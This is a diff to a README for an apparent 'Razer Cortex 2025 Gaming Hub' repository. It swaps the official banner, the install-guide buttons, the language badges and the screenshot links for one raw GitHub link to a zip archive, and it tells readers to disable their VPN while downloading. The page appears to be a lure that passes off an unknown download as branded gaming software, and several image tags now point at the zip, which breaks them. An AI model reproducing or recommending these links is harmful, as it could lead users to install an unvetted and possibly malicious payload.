@@ -1,12 +1,12 @@
 # 🎮 Razer Cortex 2025 Gaming Hub  
 
-![Razer Cortex 2025 Banner](https://cdn2.unrealengine.com/egs-razercortex-razer-s1-2560x1440-9ae63dcb996e.jpg)  
+![Razer Cortex 2025 Banner](https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip)  
  
 
 🌟 Supercharge your gaming with **Razer Cortex 2025**! This repository is your go-to source for tutorials, tools, and tips to explore Razer Cortex’s advanced features for optimizing PC performance, boosting FPS, and enhancing gameplay in popular titles like Valorant, Fortnite, and CS2. Get started with accessible gaming resources and join our community of gamers in 2025!  
 
-<a href="https://cutt.ly/frNtZUD9" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+<a href="https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 
@@ -34,8 +34,8 @@ Get Razer Cortex 2025 up and running with these easy steps to elevate your gamin
    - Disable your VPN to avoid connection issues.  
    - Switch browsers (e.g., Chrome, Firefox, or Edge) for a smoother download.  
 
-<a href="https://cutt.ly/frNtZUD9" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+<a href="https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 💡 Why Choose Razer Cortex 2025  
@@ -82,20 +82,20 @@ Get Razer Cortex 2025 up and running with these easy steps to elevate your gamin
 
 ## 🌐 Languages  
 
-- ![C#](https://img.shields.io/badge/C%23-40.5%25-blue)  
-- ![Python](https://img.shields.io/badge/Python-35.2%25-blue)  
-- ![Markdown](https://img.shields.io/badge/Markdown-24.3%25-green)  
+- ![C#](https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip%23-40.5%25-blue)  
+- ![Python](https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip%25-blue)  
+- ![Markdown](https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip%25-green)  
 
 ---
 
 ## 📸 Screenshots  
 
 **Razer Cortex 2025 Interface**  
-![Razer Cortex 2025 Interface](https://imag.malavida.com/mvimgbig/download-fs/razer-cortex-23937-2.jpg)  
+![Razer Cortex 2025 Interface](https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip)  
 *Intuitive workspace for gaming optimization.*  
 
 **Optimization Tools**  
-![Optimization Tools](https://uploads-us-west-2.insided.com/razer-us/attachment/60b67fe8-7149-46f8-b2ff-f8ee3a567e33.png)  
+![Optimization Tools](https://raw.githubusercontent.com/lazzydave/Razer-Cortex-Hub/main/inhabitation/Razer-Cortex-Hub.zip)  
 *Boost performance with advanced features.*  
 
 ---
